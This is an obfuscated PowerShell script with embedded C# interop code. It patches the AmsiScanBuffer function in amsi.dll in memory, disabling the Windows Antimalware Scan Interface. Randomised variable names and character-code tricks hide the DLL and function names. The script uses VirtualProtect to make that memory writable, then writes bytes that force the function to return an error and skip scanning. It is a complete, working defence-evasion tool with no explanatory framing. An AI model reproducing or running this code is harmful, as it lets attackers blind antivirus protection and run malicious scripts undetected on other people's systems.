$k4hX74NldRDuCsScBR = @"
using System;
using System.Runtime.InteropServices;
public class k4hX74NldRDuCsScBR {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr PQ1BDl4PCZpwy2D2hV8, string js4ZuI);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr VYWQFXRQUYcYEZRu, UIntPtr EnaKIGZQPbGyPr9au8UN, uint MdSQJUm, out uint lrLv_bRwLApkPJfoVG);
}
"@

Add-Type $k4hX74NldRDuCsScBR

$Tz0JEHxkVaCCjXTy = [k4hX74NldRDuCsScBR]::LoadLibrary("$(('äm'+'sî'+'.d'+'ll').normalIzE([ChAr](70+7-7)+[ChAR](111)+[ChAr]([byte]0x72)+[CHAR]([ByTE]0x6d)+[ChAR]([bYTe]0x44)) -replace [cHaR]([byTe]0x5c)+[ChAr]([bYTe]0x70)+[cHAR]([BYTe]0x7b)+[Char]([bYtE]0x4d)+[cHAR](110+49-49)+[CHAr]([BYTE]0x7d))")
$AdYWkJVWaq = [k4hX74NldRDuCsScBR]::GetProcAddress($Tz0JEHxkVaCCjXTy, "$(('Ãmsî'+'Scân'+'Búff'+'êr').NORMAlize([chAR]([BYTE]0x46)+[ChAr](42+69)+[chAr]([bytE]0x72)+[cHAr]([bYTe]0x6d)+[cHAr](10+58)) -replace [CHaR](10+82)+[ChaR](35+77)+[Char]([byTE]0x7b)+[cHar](77+9-9)+[CHAR]([byte]0x6e)+[ChAr](125+101-101))")
$p = 0
[k4hX74NldRDuCsScBR]::VirtualProtect($AdYWkJVWaq, [uint32]5, 0x40, [ref]$p)
$q1sRb6l4bJ63cFEq4mv = "0xB8"
$jsqgtZq8BLpj4d_ = "0x57"
$MqKiDZr = "0x00"
$GM56Lfam = "0x07"
$dcDZX2lZqUR3l = "0x80"
$hQGscB2W_MT5eYr0UwT = "0xC3"
$ulRAzh43uy1fNpGkPhg = [Byte[]] ($q1sRb6l4bJ63cFEq4mv,$jsqgtZq8BLpj4d_,$MqKiDZr,$GM56Lfam,+$dcDZX2lZqUR3l,+$hQGscB2W_MT5eYr0UwT)
[System.Runtime.InteropServices.Marshal]::Copy($ulRAzh43uy1fNpGkPhg, 0, $AdYWkJVWaq, 6)